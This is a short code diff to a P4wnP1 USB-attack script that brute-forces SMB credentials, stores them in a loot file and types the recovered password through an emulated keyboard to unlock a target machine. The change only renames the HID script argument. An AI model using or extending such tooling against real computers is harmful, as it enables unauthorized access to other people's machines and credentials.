@@ -12,6 +12,7 @@
 password_process_file="/usr/local/P4wnP1/scripts/ppf.txt"
 password_loot_file="/usr/local/P4wnP1/loot/credentials.txt"
 unlock_hid_script="/usr/local/P4wnP1/HIDScripts/hid_enter_login_password.js"
+unlock_hid_script_short="hid_enter_login_password.js"
 user_bruteforce_list="/usr/local/P4wnP1/wordlists/user.txt"
 pass_bruteforce_list="/usr/local/P4wnP1/wordlists/pass2.txt"
 # 4. Put this script under /usr/local/P4wnP1/scripts/P4wnP1-PySMBCredsBruteforceUnlock.sh
@@ -46,7 +47,7 @@ echo "press(\"ESC\");" >> $unlock_hid_script
 echo "delay(2000)" >> $unlock_hid_script
 echo "type(\"$pass\n\")" >> $unlock_hid_script
 echo "[*] Unlocking target machine..."
-P4wnP1_cli hid run $unlock_hid_script
+P4wnP1_cli hid run $unlock_hid_script_short
 echo "[*] Unlocked successfully!"
 else
 echo ""
